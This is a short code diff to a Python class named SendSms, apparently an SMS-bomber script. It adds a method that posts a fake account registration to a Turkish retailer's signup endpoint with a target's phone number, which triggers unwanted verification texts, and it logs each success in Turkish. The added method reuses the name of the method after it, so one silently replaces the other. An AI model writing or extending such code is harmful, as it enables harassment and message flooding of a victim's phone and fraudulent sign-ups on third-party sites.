@@ -100,7 +100,28 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> shop.naosstars.com")
           
-        
+#lcwaikiki.com
+    def Wmf(self):
+        try:
+            wmf = requests.post("https://www.lcwaikiki.com/tr-TR/TR/uye-ol", data={
+                "confirm": "true",
+                "date_of_birth": "1956-03-01",
+                "email": self.mail,
+                "email_allowed": "true",
+                "first_name": "Memati",
+                "gender": "male",
+                "last_name": "Bas",
+                "password": "31ABC..abc31",
+                "phone": f"0{self.phone}"
+            })
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> lcwaikiki.com")
+                self.adet += 1   
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> lcwaikiki.com")        
+
     #wmf.com.tr
     def Wmf(self):
         try:
